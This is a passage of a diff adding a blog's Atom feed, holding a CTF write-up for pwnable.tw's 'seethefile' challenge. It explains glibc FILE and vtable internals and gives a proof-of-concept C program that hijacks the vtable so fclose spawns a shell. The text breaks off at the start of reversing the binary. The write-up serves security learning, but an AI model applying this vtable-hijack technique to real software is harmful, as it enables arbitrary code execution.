@@ -1,0 +1,503 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - file-stream-oriented-programming</title>
+	<link href="/tags/file-stream-oriented-programming/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-03-30T08:23:31.139+00:00</updated>
+	<id>/tags/file-stream-oriented-programming/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.tw - seethefile</title>
+		<published>2020-03-29T01:23:36.608+00:00</published>
+		<updated>2020-03-30T08:23:31.139+00:00</updated>
+		<link href="/posts/pwnable-tw-seethefile/" type="text/html"/>
+		<id>/posts/pwnable-tw-seethefile/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Can you see anything?&lt;&#x2F;p&gt;
+&lt;p&gt;Get a shell for me.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10200&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;chall&#x2F;seethefile&quot;&gt;seethefile&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;libc&#x2F;libc_32.so.6&quot;&gt;libc.so&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;io-file-plus&quot;&gt;_IO_FILE_plus&lt;&#x2F;h2&gt;
+&lt;p&gt;Files are internally represented using the &lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;libioP.h#L342&quot;&gt;&lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; struct in glibc:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_FILE_plus
+{
+  _IO_FILE file;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;const struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_jump_t *vtable;
+};
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;This struct is cast to an opaque &lt;code&gt;FILE&lt;&#x2F;code&gt; pointer and returned from &lt;code&gt;fopen&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;io-file&quot;&gt;_IO_FILE&lt;&#x2F;h2&gt;
+&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;elixir.bootlin.com&#x2F;glibc&#x2F;glibc-2.23&#x2F;source&#x2F;libio&#x2F;libio.h#L241&quot;&gt;&lt;code&gt;_IO_FILE&lt;&#x2F;code&gt;&lt;&#x2F;a&gt; struct contains buffered data and other details about a file:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_FILE {
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _flags;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* High-order word is _IO_MAGIC; rest is flags. *&#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_file_flags _flags
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* The following pointers correspond to the C++ streambuf protocol. *&#x2F;
+  &#x2F;* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_ptr;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Current read pointer *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of get area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_read_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of putback+get area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of put area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_ptr;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Current put pointer. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_write_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of put area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_buf_base;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Start of reserve area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_buf_end;	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* End of reserve area. *&#x2F;
+  &#x2F;* The following fields are used to support backing up and undo. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_save_base; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to start of non-current get area. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_backup_base;  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to first valid character of backup area *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_save_end; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* Pointer to end of non-current get area. *&#x2F;
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_marker *_markers;
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _IO_FILE *_chain;
+  
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _fileno;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _flags2;
+  _IO_off_t _old_offset; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* This used to be _offset but it&amp;#39;s too small.  *&#x2F;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#define &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;__HAVE_COLUMN &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* temporary *&#x2F;
+  &#x2F;* 1+column number of pbase(); 0 is unknown. *&#x2F;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;unsigned short&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _cur_column;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;signed char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _vtable_offset;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; _shortbuf[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;*  char* _save_gptr;  char* _save_egptr; *&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;
+
+  _IO_lock_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_lock;
+};
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h2 id=&quot;io-jump-t-vtable&quot;&gt;_IO_jump_t (vtable)&lt;&#x2F;h2&gt;
+&lt;p&gt;Even more interestingly, the &lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt; struct contains a field named &lt;code&gt;vtable&lt;&#x2F;code&gt;. This field acts as a jump table 
+containing virtual functions that are used when interacting with the file.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;_IO_jump_t
+{
+    JUMP_FIELD(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, __dummy);
+    JUMP_FIELD(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;* showmany *&#x2F;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+};
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;For example, when &lt;code&gt;fclose(FILE *ptr)&lt;&#x2F;code&gt; is called, the function pointer stored in the &lt;code&gt;__finish&lt;&#x2F;code&gt;  field in the struct will 
+be called after freeing internal structures. &lt;&#x2F;p&gt;
+&lt;h2 id=&quot;attacking-files-file-stream-oriented-programming&quot;&gt;Attacking FILEs (File-Stream Oriented Programming)&lt;&#x2F;h2&gt;
+&lt;p&gt;If we are able to call file-related functions (fclose, fread, etc.) on a pointer we can redirect execution by creating 
+entries in the &lt;code&gt;vtable&lt;&#x2F;code&gt; field in &lt;code&gt;_IO_FILE_plus&lt;&#x2F;code&gt;. I created an example program to demonstrate an attack by creating a 
+fake &lt;code&gt;FILE&lt;&#x2F;code&gt; struct:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; gcc -m32 test.c -o test
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdio.h&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;#include &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;lt;stdlib.h&amp;gt;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; vtable[] &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(size_t, __dummy);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(size_t, __dummy2);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_finish_t, __finish);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_overflow_t, __overflow);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_underflow_t, __underflow);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_underflow_t, __uflow);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_sync_t, __sync);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_read_t, __read);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_write_t, __write);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_seek_t, __seek);
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    system,  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; JUMP_FIELD(_IO_close_t, __close);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_stat_t, __stat);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;NULL  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F;    JUMP_FIELD(_IO_imbue_t, __imbue);
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;};
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc, &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv) {
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Creates a file and overwrites the vtable field in the FILE struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;    FILE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;fp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fopen&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;dev&#x2F;null&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;vtable_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void *&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) fp) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ sizeof&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(FILE);
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;vtable_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)vtable;
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Moves &amp;quot;&#x2F;bin&#x2F;sh\x00&amp;quot; to the start of the file pointer.
+    &#x2F;&#x2F; When system is called, it will interpret the FILE* as a char*, which
+    &#x2F;&#x2F; means that the interpreted string will be &amp;quot;&#x2F;bin&#x2F;sh&amp;quot; due to the null byte.
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;strcpy&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;&#x2F;&#x2F; Calls system with the FILE pointer as an argument. This should create
+    &#x2F;&#x2F; a shell.
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;fclose&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(fp);
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Running this test program gives us a shell and then segfaults:
+&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-seethefile&#x2F;5e80319b0f5e61083b61b4a9.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;&#x2F;h1&gt;
+&lt;p&gt;Reversing the program is made easy by cross-referencing the program&#x27;s behavior with Ghidra.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;main&quot;&gt;main&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argc,&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char **&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;argv){
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input;
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input_str [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;];
+  
+  init();
+  welcome();
